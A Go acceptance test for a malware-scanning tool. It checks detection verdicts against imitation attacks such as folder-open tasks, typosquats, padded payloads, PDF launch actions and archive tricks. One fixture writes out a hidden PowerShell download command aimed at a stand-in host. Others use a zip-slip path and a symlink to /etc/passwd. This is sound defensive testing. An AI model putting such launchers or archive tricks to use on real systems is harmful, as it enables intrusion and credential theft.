package acceptance_test

import (
	"archive/tar"
	"os"
	"path/filepath"
	"regexp"
	"slices"
	"strings"
	"testing"
)

// liveLink matches a URL that is not defanged. No report may contain one.
var liveLink = regexp.MustCompile(`(?i)(?:https?|ftp|file)://`)

// corpusDir returns a builder that targets a committed fixture in testdata/corpus.
func corpusDir(name string) func(t *testing.T) string {
	return func(t *testing.T) string { return corpus(t, name) }
}

// builtFile returns a builder that writes one file named name into a scratch directory with build.
func builtFile(name string, build func(t *testing.T, dest string)) func(t *testing.T) string {
	return func(t *testing.T) string {
		p := filepath.Join(t.TempDir(), name)
		build(t, p)
		return p
	}
}

// TestCorpus is the single regression list for corpus v1 (docs/milestones/M1.md section 5).
// Cases follow the order of the two tables there: malicious and suspicious imitations first,
// then the benign twins (P7).
func TestCorpus(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		target func(t *testing.T) string // returns the file or directory to analyze
		// expectations
		wantCode     int      // exit code; the verdict must match it (0 clean, 10 suspicious, 20 malicious)
		wantRules    []string // "RULE path:line" that must be present
		wantSnippets []string // each must appear in the snippet of some evidence
		wantIOCs     []string // url IOCs that must be reported (undefanged in report.json)
		wantSummary  []string // each must appear in summary.md
		wantSkips    int      // coverage skips; when zero, files_analyzed must equal files_seen
		wantQuiet    bool     // only info findings and the auto-execution inventory (GAL-AUTOEXEC-006 to 008)
	}{
		// Malicious or suspicious imitations.
		{
			name:   "fake-interview-repo: folderOpen task and postinstall script exfiltrate .env",
			target: corpusDir("fake-interview-repo"), wantCode: 20,
			wantRules: []string{"GAL-AUTOEXEC-001 .vscode/tasks.json:7", "GAL-AUTOEXEC-010 .vscode/tasks.json:7", "GAL-AUTOEXEC-005 package.json:6", "GAL-EXFIL-001 scripts/setup.js:3"},
		},
		{
			name:   "p1-folderopen-curl: JSONC tasks file runs curl on folder open",
			target: corpusDir("p1-folderopen-curl"), wantCode: 20,
			wantRules: []string{"GAL-AUTOEXEC-001 .vscode/tasks.json:7", "GAL-AUTOEXEC-010 .vscode/tasks.json:7"},
		},
		{
			name: "p1-ooxml-evasion: a stray [Content_Types].xml does not hide the zip members (built)",
			target: builtFile("evade.zip", func(t *testing.T, dest string) {
				entries := dirEntries(t, corpus(t, "p1-folderopen-curl"), "p1-folderopen-curl/")
				zipEntries(t, dest, append(entries, zipEntry{name: "sub/[Content_Types].xml", data: []byte("<Types/>")}))
			}),
			wantCode:  20,
			wantRules: []string{"GAL-AUTOEXEC-001 evade.zip!/p1-folderopen-curl/.vscode/tasks.json:7", "GAL-AUTOEXEC-010 evade.zip!/p1-folderopen-curl/.vscode/tasks.json:7"},
		},
		{
			name: "p1-ooxml-smuggle: a docx still has its payload below word/ inspected (built)",
			target: builtFile("smuggle.docx", func(t *testing.T, dest string) {
				extra := dirEntries(t, corpus(t, "p1-folderopen-curl"), "word/x/")
				zipEntries(t, dest, append(benignDocxEntries(), extra...))
			}),
			wantCode:  20,
			wantRules: []string{"GAL-AUTOEXEC-001 smuggle.docx!/word/x/.vscode/tasks.json:7", "GAL-AUTOEXEC-010 smuggle.docx!/word/x/.vscode/tasks.json:7"},
			wantIOCs:  []string{"https://docs.sinkhole.test/guide"},
		},
		{
			name: "p1-ooxml-embedded: a docx embeds a zip of the malicious repo (built)",
			target: builtFile("embed.docx", func(t *testing.T, dest string) {
				inner := filepath.Join(t.TempDir(), "pack.zip")
				zipEntries(t, inner, dirEntries(t, corpus(t, "p1-folderopen-curl"), ""))
				b, err := os.ReadFile(inner)
				if err != nil {
					t.Fatal(err)
				}
				zipEntries(t, dest, append(benignDocxEntries(), zipEntry{name: "word/embeddings/pack.zip", data: b}))
			}),
			wantCode:  20,
			wantRules: []string{"GAL-AUTOEXEC-001 embed.docx!/word/embeddings/pack.zip!/.vscode/tasks.json:7"},
		},
		{
			name:   "p1-devcontainer-init: initializeCommand pipes a download into sh",
			target: corpusDir("p1-devcontainer-init"), wantCode: 20,
			wantRules: []string{"GAL-AUTOEXEC-003 .devcontainer/devcontainer.json:5", "GAL-AUTOEXEC-011 .devcontainer/devcontainer.json:5"},
		},
		{
			name:   "p2-husky-curl-sh: pre-commit hook pipes a download into sh",
			target: corpusDir("p2-husky-curl-sh"), wantCode: 20,
			wantRules: []string{"GAL-AUTOEXEC-011 .husky/pre-commit:2"},
		},
		{
			name:   "p2-typosquat: typosquatted names and a github dependency",
			target: corpusDir("p2-typosquat"), wantCode: 10,
			wantRules: []string{"GAL-DEPS-001 package.json:6", "GAL-DEPS-002 package.json:8"},
		},
		{
			name:   "p2-pip-index: custom python index and a typosquatted requirement",
			target: corpusDir("p2-pip-index"), wantCode: 10,
			wantRules: []string{"GAL-DEPS-004 requirements.txt:2", "GAL-DEPS-001 requirements.txt:3"},
		},
		{
			name: "git-config fsmonitor: .git/config runs a command (built)",
			target: gitConfigRepo("[core]\n\trepositoryformatversion = 0\n" +
				"\tfsmonitor = ./.git/hooks/fsmonitor-evil\n"),
			wantCode:  10,
			wantRules: []string{"GAL-AUTOEXEC-009 .git/config:3"},
		},
		{
			name:   "p3-padded-js: eval of an encoded payload hidden after 300 spaces",
			target: corpusDir("p3-padded-js"), wantCode: 20,
			wantRules:    []string{"GAL-OBF-001 index.js:12"},
			wantSnippets: []string{"decoded:", "c2.sinkhole.test"},
		},
		{
			name:   "p3-padded-py: environment sent away from hidden code",
			target: corpusDir("p3-padded-py"), wantCode: 20,
			wantRules: []string{"GAL-OBF-001 app.py:9", "GAL-EXFIL-001 app.py:9"},
		},
		{
			name:   "p4-pdf-launch: OpenAction to JavaScript and Launch, URI defanged in the summary",
			target: corpusDir("p4-pdf-launch"), wantCode: 20,
			wantRules:   []string{"GAL-PDF-001 invoice.pdf:11", "GAL-PDF-002 invoice.pdf:2", "GAL-PDF-003 invoice.pdf:14"},
			wantIOCs:    []string{"http://invoice.sinkhole.test/pay"},
			wantSummary: []string{"hxxp://invoice[.]sinkhole[.]test/pay"},
		},
		{
			name:   "p4-pdf-openaction-uri: OpenAction to a URI action",
			target: corpusDir("p4-pdf-openaction-uri"), wantCode: 10,
			wantRules: []string{"GAL-PDF-002 statement.pdf:2"},
		},
		{
			name: "p5-lnk-in-zip: decoy pdf name hides a shortcut with a PowerShell launcher (built)",
			target: builtFile("invoice.zip", func(t *testing.T, dest string) {
				zipEntries(t, dest, []zipEntry{{name: "invoice.pdf.lnk", data: lnkLike("powershell.exe -w hidden -c iwr http://sinkhole.test/p")}})
			}),
			wantCode:  20,
			wantRules: []string{"GAL-NAME-001 invoice.zip!/invoice.pdf.lnk:0", "GAL-LNK-001 invoice.zip!/invoice.pdf.lnk:0"},
		},
		{
			name: "p5-rtlo-name: right-to-left override hides the exe extension (built)",
			target: builtFile("invoice"+rlo+"fdp.exe", func(t *testing.T, dest string) {
				if err := os.WriteFile(dest, []byte("harmless\n"), 0o600); err != nil {
					t.Skipf("filesystem rejects the file name: %v", err)
				}
			}),
			wantCode:  20,
			wantRules: []string{`GAL-NAME-002 invoice\u` + "202efdp.exe:0"},
		},
		{
			name: "p5-remote-template: docx built from docx-src attaches a remote template (built)",
			target: builtFile("offer.docx", func(t *testing.T, dest string) {
				zipDir(t, filepath.Join(corpus(t, "p5-remote-template"), "docx-src"), dest)
			}),
			wantCode:  10,
			wantRules: []string{"GAL-OFFICE-001 offer.docx!/word/_rels/settings.xml.rels:5"},
			wantIOCs:  []string{"http://templates.sinkhole.test/t.dotm"},
		},
		{
			name:   "p6-eml-lure: email with a script attachment and a mismatched link",
			target: corpusDir("p6-eml-lure"), wantCode: 20,
			wantRules: []string{"GAL-EXFIL-001 lure.eml!/setup.js:3", "GAL-EML-001 lure.eml:1", "GAL-EML-003 lure.eml:15"},
		},
		{
			name: "eicar: test string written at test time (built)",
			target: func(t *testing.T) string {
				return writeEICAR(t, t.TempDir())
			},
			wantCode:  20,
			wantRules: []string{"GAL-SIG-001 eicar.txt:1"},
		},
		{
			name: "archive-zipslip: member with a ../ name is reported and never extracted (built)",
			target: builtFile("evil.zip", func(t *testing.T, dest string) {
				zipEntries(t, dest, []zipEntry{{name: "../../evil.sh", data: []byte("echo hi\n")}, {name: "ok.txt", data: []byte("fine\n")}})
			}),
			wantCode:  10,
			wantRules: []string{"GAL-ARCHIVE-001 evil.zip!/../../evil.sh:0"},
		},
		{
			name: "archive-bomb: 200 MiB of zeros stops at the ratio limit (built)",
			target: builtFile("bomb.zip", func(t *testing.T, dest string) {
				zipZeros(t, dest, "zeros.bin", 200<<20)
			}),
			wantCode:  10,
			wantRules: []string{"GAL-ARCHIVE-003 bomb.zip:0"},
			wantSkips: 1,
		},
		{
			name: "archive-symlink: tar symlink to /etc/passwd is reported and never resolved (built)",
			target: builtFile("links.tgz", func(t *testing.T, dest string) {
				tarGz(t, dest, []tarEntry{{name: "link", typeflag: tar.TypeSymlink, link: "/etc/passwd"}, {name: "ok.txt", data: []byte("fine\n")}})
			}),
			wantCode:  10,
			wantRules: []string{"GAL-ARCHIVE-002 links.tgz!/link:0"},
		},

		// Benign twins (P7).
		{
			name:   "benign-express-app: express starter with tasks without runOn and a CI workflow",
			target: corpusDir("benign-express-app"), wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-go-cli: Makefile with a tool installer and pre-commit remote hooks",
			target: corpusDir("benign-go-cli"), wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-python-lib: setuptools project",
			target: corpusDir("benign-python-lib"), wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-husky-lint: husky runs lint-staged",
			target: corpusDir("benign-husky-lint"), wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-minified-js: long minified line and a data-URI",
			target: corpusDir("benign-minified-js"), wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-pdf: destination OpenAction and one link",
			target: corpusDir("benign-pdf"), wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-docx: internal and external hyperlinks (built)",
			target: builtFile("guide.docx", benignDocx), wantCode: 0, wantQuiet: true,
			wantIOCs: []string{"https://docs.sinkhole.test/guide"},
		},
		{
			name: "benign-docx-media: the same docx with an image member (built)",
			target: builtFile("guide.docx", func(t *testing.T, dest string) {
				zipEntries(t, dest, append(benignDocxEntries(), zipEntry{name: "word/media/image1.png", data: []byte("\x89PNG\r\n\x1a\n")}))
			}),
			wantCode: 0, wantQuiet: true,
			wantIOCs: []string{"https://docs.sinkhole.test/guide"},
		},
		{
			name:   "benign-eml-newsletter: a link and no attachment",
			target: corpusDir("benign-eml-newsletter"), wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-npm-deps: npm project with a registry lockfile (twin of p2-typosquat)",
			target: corpusDir("benign-npm-deps"), wantCode: 0, wantQuiet: true,
		},
		{
			name: "benign devcontainer: image and forwardPorts only (built, twin of p1-devcontainer-init)",
			target: filesRepo(map[string]string{
				".devcontainer/devcontainer.json": "{\n  \"image\": \"mcr.microsoft.com/devcontainers/base:ubuntu\",\n  \"forwardPorts\": [3000]\n}\n",
			}),
			wantCode: 0, wantQuiet: true,
		},
		{
			name:     "benign git config: built-in fsmonitor daemon (built, twin of git-config fsmonitor)",
			target:   gitConfigRepo("[core]\n\trepositoryformatversion = 0\n\tfsmonitor = true\n"),
			wantCode: 0, wantQuiet: true,
		},
		{
			name:   "benign-archive: zip of benign-go-cli (built)",
			target: builtFile("benign.zip", zipOfBenignCLI), wantCode: 0, wantQuiet: true,
		},
		{
			name:   "built galahad binary: a normal Go executable",
			target: func(*testing.T) string { return binPath }, wantCode: 0, wantQuiet: true,
		},
	}
	verdicts := map[int]string{0: "clean", 10: "suspicious", 20: "malicious"}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Given a fixture, committed or built at test time
			target := tt.target(t)
			// When the agent analyzes it
			rep, out := analyzeOut(t, target, tt.wantCode)
			// Then the verdict, the findings at their lines and the coverage match
			if rep.Verdict != verdicts[tt.wantCode] {
				t.Errorf("verdict = %q, want %q", rep.Verdict, verdicts[tt.wantCode])
			}
			for _, want := range tt.wantRules {
				rule, at, _ := strings.Cut(want, " ")
				if !hasFinding(rep, rule, at) {
					t.Errorf("no %s at %s in %+v", rule, at, rep.Findings)
				}
			}
			for _, want := range tt.wantSnippets {
				found := false
				for _, f := range rep.Findings {
					for _, e := range f.Evidence {
						found = found || strings.Contains(e.Snippet, want)
					}
				}
				if !found {
					t.Errorf("no evidence snippet contains %q in %+v", want, rep.Findings)
				}
			}
			var iocs []string
			for _, i := range rep.IOCs {
				if i.Type == "url" {
					iocs = append(iocs, i.Value)
				}
			}
			for _, want := range tt.wantIOCs {
				if !slices.Contains(iocs, want) {
					t.Errorf("url iocs %q lack %q", iocs, want)
				}
			}
			if tt.wantQuiet {
				quiet := otherFindings(rep)
				for _, f := range rep.Findings {
					if f.Severity != "info" && slices.Contains(quiet, f.RuleID) {
						t.Errorf("benign fixture has a %s finding %s", f.Severity, f.RuleID)
					}
				}
			}
			if len(rep.Coverage.Skipped) != tt.wantSkips {
				t.Errorf("skips = %+v, want %d", rep.Coverage.Skipped, tt.wantSkips)
			}
			if tt.wantSkips == 0 && rep.Coverage.FilesAnalyzed != rep.Coverage.FilesSeen {
				t.Errorf("files_analyzed/files_seen = %d/%d, want all analyzed", rep.Coverage.FilesAnalyzed, rep.Coverage.FilesSeen)
			}
			summary := readFile(t, filepath.Join(out, "summary.md"))
			for _, want := range tt.wantSummary {
				if !strings.Contains(summary, want) {
					t.Errorf("summary.md lacks %q:\n%s", want, summary)
				}
			}
			// And the target line matches its kind: a file shows its SHA-256, a folder its file count
			switch rep.Target.Kind {
			case "file":
				if rep.Target.SHA256 == "" || !strings.Contains(summary, "- SHA-256: "+rep.Target.SHA256) {
					t.Errorf("file target sha256 %q is not in summary.md:\n%s", rep.Target.SHA256, summary)
				}
			default:
				if !strings.Contains(summary, "- Kind: folder, ") || strings.Contains(summary, "SHA-256") {
					t.Errorf("summary.md of a folder target is wrong:\n%s", summary)
				}
			}
			for _, name := range []string{"summary.md", "report.html"} {
				if m := liveLink.FindString(readFile(t, filepath.Join(out, name))); m != "" {
					t.Errorf("%s has a live link %q", name, m)
				}
			}
		})
	}
}
